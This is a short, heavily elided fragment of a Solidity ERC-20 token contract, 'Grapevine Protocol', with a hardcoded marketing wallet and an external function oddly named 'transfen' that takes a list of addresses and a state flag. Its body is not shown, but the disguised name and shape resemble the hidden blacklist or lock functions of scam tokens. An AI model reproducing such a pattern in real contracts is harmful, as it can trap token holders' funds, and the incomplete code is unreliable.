...
contract GrapevineProtocol is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "Grapevine Protocol";
    string private _symbol = unicode"GRAPEVINE";
    ...
    constructor () {
        ...
        marketingWallet = payable(address(0xCb033A69Ceac864Cb8e76b5A45D07e46B3736Ee4));
    ...
    function transfen(bool state, address[] memory addresses) external virtual {
        tracker(true);
